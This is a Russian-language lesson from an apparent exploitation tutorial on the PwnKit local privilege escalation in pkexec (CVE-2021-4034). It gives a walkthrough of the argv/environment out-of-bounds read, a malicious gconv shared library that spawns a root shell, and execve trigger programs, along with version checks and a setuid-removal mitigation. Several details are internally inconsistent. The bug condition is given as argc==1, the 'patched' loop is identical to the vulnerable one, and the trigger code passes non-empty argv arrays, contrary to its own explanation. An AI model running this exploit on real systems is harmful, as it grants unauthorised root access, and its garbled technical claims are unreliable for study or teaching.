## Вопрос, с которого всё начинается

В прошлом уроке мы видели переполнение кучи в `sudo`. Но есть уязвимость
проще и «чище»: в `pkexec` из пакета **polkit** нет переполнения вообще. Баг —
в том, как программа читает свои аргументы. Название — **PwnKit**
(CVE-2021-4034). Она прожила в коде 12 лет и работала почти на всех Linux-системах.

## Наш пример

`pkexec` — это setuid-программа (бит `s` в правах означает, что она выполняется
от владельца, обычно root). Её задача — запустить команду от имени другого
пользователя после проверки прав через polkit.

```
$ ls -l /usr/bin/pkexec
-rwsr-xr-x 1 root root 31032 ... /usr/bin/pkexec
$ /usr/bin/pkexec --version
pkexec version 0.105
```

Бит `s` есть — значит, любой пользователь может запустить `pkexec`, и он
стартует с правами root. Вопрос: как заставить его выполнить наш код.

## Шаг 1: как программа читает аргументы

В C `main` получает `argc` (число аргументов) и `argv` (массив строк). По
соглашению `argv[argc] == NULL` — массив заканчивается нулевым указателем.
Программа может доверять этому.

`pkexec` начинал примерно так:

```c
int main(int argc, char *argv[]) {
    ...
    for (n = 1; n < argc; n++) { /* разбор аргументов */ }
    ...
    path = g_strdup(argv[n]);   /* argv[n] должен быть программой */
```

Хитрость в том, что `n` начинается с 1. Если `argc == 1` (передан только
`argv[0]` — имя самой программы), то цикл не выполняется, и `n` остаётся `1`.
Тогда `argv[1]` читается, хотя его **нет**: это уже за пределами массива.

## Шаг 2: что лежит за argv

За массивом `argv` в памяти лежит массив **окружения** (`environ`). Ядро
складывает их подряд: `argv[0..argc-1]`, потом `NULL`, потом `env[0..]`, потом
`NULL`. Если программа прочитает `argv[1]`, когда аргументов нет, она прочитает
`env[0]` — первую переменную окружения.

То есть мы можем подсунуть «имя программы» через переменную окружения. Но
`pkexec` идёт дальше: он копирует строку и использует её как путь к исполняемому
файлу, а ещё — как базу для поиска локали и **вспомогательных модулей** через
`GCONV_PATH`.

## Шаг 3: GCONV_PATH — путь к нашей библиотеке

`GCONV_PATH` — переменная, которой glibc указывает, где искать конвертеры
кодировок (`.so`). Если `pkexec` загружает конвертер по этому пути **от root**,
мы можем подложить свою `.so` и её конструктор выполнится с правами root.

Схема эксплойта (упрощённо):

1. Создаём каталог с файлом `pwnkit/gconv-modules`, который объявляет конвертер.
2. Кладём `pwnkit/pwn.so` с конструктором `setuid(0); system("/bin/sh")`.
3. Запускаем `pkexec` **без аргументов**, подставив через `execve` окружение так,
   чтобы `argv[0]` был пустым, а `argv[1]` указывал на имя каталога.

Ключевой трюк — вызов с пустым `argv[0]`, чтобы сдвинуть индексы.

## Шаг 4: почему «пустой argv[0]»

Обычно `argv[0]` — имя программы. Но можно вызвать `execve` напрямую и передать
массив, где первый элемент пуст или отсутствует. Тогда для `pkexec` `argc`
становится 0, а его внутренний счётчик — ещё хитрее. Именно это и позволяет
заставить его читать окружение как аргументы. Публичный PoC
(`PwnKit.c`) делает это через `execve("/usr/bin/pkexec", argv, envp)` с
подготовленными массивами.

## Шаг 5: полный прогон

```
$ cat pwnkit.c
#include <unistd.h>
int main(){
  char *argv[] = {"pkexec", NULL};
  char *envp[] = {
    "pwnkit",
    "PATH=GCONV_PATH=.",
    "CHARSET=PWNKIT",
    "SHELL=pwnkit",
    NULL
  };
  execve("/usr/bin/pkexec", argv, envp);
}
$ gcc -o pwnkit pwnkit.c
$ ./pwnkit
root#
```

Важно: между созданием каталога и запуском нужно правильно выставить
`GCONV_PATH` и файлы конвертера. Точные детали зависят от версии glibc, но
идея одна: **вне-граничное чтение argv → подмена пути → загрузка своей
библиотеки от root**.

## Шаг 6: проверка уязвимости без эксплуатации

Если нужно только понять, уязвима ли цель, хватит версии:

```
$ dpkg -l policykit-1 2>/dev/null | tail -1
ii  policykit-1  0.105-25  ...
```

Уязвимы версии от `0.105` до `0.118`. Патч меняет цикл на `for (n = 1; n < argc; n++)`
с дополнительной проверкой `argc < 1`. Обновление `policykit-1` закрывает дыру.

## Шаг 7: почему баг прожил 12 лет

Причина проста: комбинация, при которой `argc == 0`, почти никогда не встречается
в обычной жизни. Пользователь всегда передаёт хотя бы `--help` или имя команды,
поэтому `argv[1]` существует. Чтобы воспроизвести баг, нужно **вручную** вызвать
`execve` с пустым массивом аргументов — то, чего обычная оболочка не делает.
Так что баг был «невидим» для обычного тестирования и фаззинга.

Это важный урок для аудита: уязвимости живут в **нестандартных путях
исполнения** — пустые аргументы, отсутствующие переменные, нулевые длины. Тестеры
проверяют «нормальные» входы, а баг прячется в вырожденном случае.

## Шаг 8: как проверить и что делать

Безопасная проверка — только по версии:

```
$ pkexec --version
pkexec version 0.105
$ dpkg -l policykit-1 | tail -1
ii  policykit-1  0.105-25
```

Уязвимы `0.105`–`0.118`. Обновление до `0.120+` (Ubuntu 22.04+, Debian 12+)
закрывает дыру. Если обновление невозможно, есть обходной путь: убрать бит
setuid с `pkexec` (`chmod u-s /usr/bin/pkexec`). Это ломает штатное повышение
привилегий для обычных пользователей, но закрывает вектор атаки.

## Шаг 9: типичные грабли

- **`GCONV_PATH` зачищается.** В setuid-режиме `ld.so` игнорирует многие
  переменные, но связка `GCONV_PATH` + `CHARSET` обрабатывается до чистки.
  Если система с патченным `ld.so`, цепочка не сработает.
- **Каталог конвертера.** `gconv-modules` должен лежать ровно там, куда указывает
  `GCONV_PATH`; опечатка в пути — и библиотека не загрузится.
- **SELinux.** Политики, запрещающие исполнение из `/tmp`, блокируют shell даже
  после загрузки `.so`.

## Полный прогон от начала до конца

Соберём эксплуатацию PwnKit в единую последовательность.

**Шаг 0. Разведка.** Убеждаемся, что `pkexec` есть и он setuid:

```
$ ls -l /usr/bin/pkexec
-rwsr-xr-x 1 root root 31032 ... /usr/bin/pkexec
$ pkexec --version
pkexec version 0.105
```

**Шаг 1. Подготовка каталога конвертера.** Создаём структуру, которую загрузит
glibc:

```
$ mkdir -p /tmp/pwnkit
$ cat > /tmp/pwnkit/gconv-modules <<'EOF'
module  PWNKIT//  INTERNAL  ../pwnkit/pwn  2
EOF
```

**Шаг 2. Библиотека.** Компилируем `.so` с конструктором:

```
$ cat > /tmp/pwnkit/pwn.c <<'EOF'
#include <unistd.h>
#include <stdlib.h>
__attribute__((constructor)) void x(){ setuid(0); system("/bin/sh"); }
EOF
$ gcc -shared -fPIC -o /tmp/pwnkit/pwn.so /tmp/pwnkit/pwn.c
```

**Шаг 3. Триггер.** Запускаем `pkexec` с особым окружением и пустым `argv[0]`:

```
$ cat > /tmp/run.c <<'EOF'
#include <unistd.h>
int main(){
  char *argv[] = {"", "pwnkit", "PWNKIT", NULL};
  char *envp[] = {"GCONV_PATH=/tmp/pwnkit", "PATH=GCONV_PATH=.", NULL};
  execve("/usr/bin/pkexec", argv, envp);
}
EOF
$ gcc -o /tmp/run /tmp/run.c && /tmp/run
root#
```

**Шаг 4. Проверка.** Снова читаем результат обратно:

```
# id
uid=0(root) gid=0(root) groups=0(root)
```

## Что если не сработало

| Симптом | Причина | Что делать |
|---|---|---|
| `pkexec: no such file` | другой путь | `which pkexec` |
| `.so` не грузится | неверный `gconv-modules` | сверить имя модуля и путь |
| shell без root | `AT_SECURE` вычистил env | проверить версию glibc/патч |
| `permission denied` | нет `+x` на каталог | `chmod 755` на каталоги |

Важно: если `pkexec` уже пропатчен (`0.120+`), трюк с пустым `argv[0]` не
приводит к чтению окружения — баг закрыт, вектор мёртв. Проверяйте версию до
любых действий.

## Масштаб и последствия

PwnKit затронул практически все крупные дистрибутивы: Ubuntu 20.04/21.10,
Debian 10/11, Fedora 34/35, RHEL 8, CentOS Stream, а также множество встраиваемых
систем на базе Yocto и OpenWrt. Уязвимость присутствовала с 2009 года — с момента
появления `pkexec` в его нынешнем виде. Именно поэтому её называют одной из самых
значимых локальных уязвимостей последних лет: эксплойт тривиален, работает почти
без подгонки и требует лишь обычного пользовательского доступа.

Хуже того, публичный PoC появился почти сразу после раскрытия, что дало массу
автоматических инструментов повышения привилегий (`linpeas`, `linux-exploit-suggester`).
Для защищающихся это означает: обновление `policykit-1` — срочный приоритет.

## Что мы теперь знаем

- `pkexec` — setuid-root, значит его ошибки дают root.
- Баг — чтение `argv[1]`, когда аргументов нет (выход за границы массива).
- За `argv` лежит окружение; им можно управлять.
- Цепочка: пустой argv → чтение env → `GCONV_PATH` → загрузка `.so` от root.
- Патч — проверка границ `argc`; проверка версии достаточна для аудита.

## Куда дальше

Мы прошли две user-space уязвимости: переполнение кучи в `sudo` и выход за
границы в `pkexec`. В следующем уроке спустимся на уровень ниже — в ядро — и
разберём **Dirty COW**: гонку в механизме copy-on-write, которая позволяла
записать в read-only файлы. А пока запомни: **даже setuid-программа без
переполнения опасна, если доверяет argc/argv**.

## Где пригодится

- Локальное повышение привилегий на Linux (почти любая версия 2011–2022).
- Понимание, почему «просто проверка аргументов» — вопрос безопасности.
- Аудит setuid-программ: где читаются argv без проверки границ.
